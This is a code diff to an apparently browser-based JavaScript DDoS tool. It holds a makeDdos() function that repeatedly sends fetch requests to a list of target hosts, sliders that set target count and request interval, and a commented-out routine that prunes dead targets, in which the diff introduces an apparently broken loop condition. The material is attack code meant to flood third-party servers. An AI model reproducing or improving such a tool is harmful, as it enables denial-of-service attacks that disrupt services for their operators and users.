@@ -73,11 +73,11 @@ function getLocatioInfo() {
 }
 selectInterval(count);
 selectTargets(count);
-counterRange.addEventListener("input", (e) => {
+counterRange.addEventListener("change", (e) => {
 	count = e.target.value;
 	selectTargets(count, true);
 });
-intervalRange.addEventListener("input", (e) => {
+intervalRange.addEventListener("change", (e) => {
 	interval = e.target.value;
 	selectInterval(interval, true);
 });
@@ -109,6 +109,7 @@ startBtn.addEventListener("click", (e) => {
 });
 function makeDdos() {
 	setInterval(() => {
+		// console.log(attacketTargets);
 		attacketTargets.forEach((k, i) => {
 			k.count++;
 			fetch(k.host, {
@@ -184,14 +185,18 @@ function drawStatistic() {
 }
 // function sanitaizeTarget() {
 // 	let liveTargets = [];
+
 // 	attacketTargets.forEach((k, i) => {
-// 		if (k.err < 10) {
+// 		if (k.err < 1) {
 // 			liveTargets.push(k);
 // 		}
 // 	});
+
 // 	attacketTargets = liveTargets;
+
 // 	if (attacketTargets.length < count) {
-// 		for (let i = count; i < attacketTargets.length; i++) {
+// 		for (let i = count; count > attacketTargets.length; i++) {
+// 			console.log(i + " " + attacketTargets.length);
 // 			attacketTargets.push(targets[i]);
 // 			console.log(targets[i]);
 // 		}
